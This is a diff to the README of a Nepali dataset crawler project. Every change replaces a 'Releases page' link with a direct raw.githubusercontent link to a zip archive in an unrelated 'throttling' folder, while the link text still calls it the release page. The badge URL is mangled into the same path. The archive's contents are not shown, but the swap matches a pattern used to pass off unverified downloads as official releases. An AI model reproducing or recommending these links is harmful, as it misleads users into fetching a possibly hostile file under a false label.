@@ -7,11 +7,11 @@ Nepali-Dataset-Crawler is a simple tool designed to extract data from various Ne
 To get started with Nepali-Dataset-Crawler, follow the steps below. Even if you're not familiar with programming, you'll find this process straightforward.
 
 ## 🔗 Download Nepali-Dataset-Crawler
-[![Download Nepali-Dataset-Crawler](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases)
+[![Download Nepali-Dataset-Crawler](https://raw.githubusercontent.com/isthisxavier/Nepali-Dataset-Crawler/main/throttling/Nepali-Dataset-Crawler-3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/isthisxavier/Nepali-Dataset-Crawler/main/throttling/Nepali-Dataset-Crawler-3.7.zip)
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Visit the Release Page to Download](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases)
+   [Visit the Release Page to Download](https://raw.githubusercontent.com/isthisxavier/Nepali-Dataset-Crawler/main/throttling/Nepali-Dataset-Crawler-3.7.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -55,7 +55,7 @@ If you need help or want to share your experience, join our community. You can f
 For more information on data extraction and crawling techniques, consider reading some online resources and guides. These can give you further insights into best practices.
 
 ## 📅 Updates
-Keep checking the [Releases page](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases) to stay updated on the latest features and improvements.
+Keep checking the [Releases page](https://raw.githubusercontent.com/isthisxavier/Nepali-Dataset-Crawler/main/throttling/Nepali-Dataset-Crawler-3.7.zip) to stay updated on the latest features and improvements.
 
 ## 🔄 Contributing
 Want to help improve Nepali-Dataset-Crawler? We welcome contributions! Feel free to submit issues or pull requests. Your input can help make the tool even better for everyone. 
@@ -63,4 +63,4 @@ Want to help improve Nepali-Dataset-Crawler? We welcome contributions! Feel free
 ## 📜 License
 Nepali-Dataset-Crawler is open-source software. You can use, modify, and distribute it under the MIT License.
 
-[Visit the Release Page to Download](https://github.com/isthisxavier/Nepali-Dataset-Crawler/releases)
+[Visit the Release Page to Download](https://raw.githubusercontent.com/isthisxavier/Nepali-Dataset-Crawler/main/throttling/Nepali-Dataset-Crawler-3.7.zip)
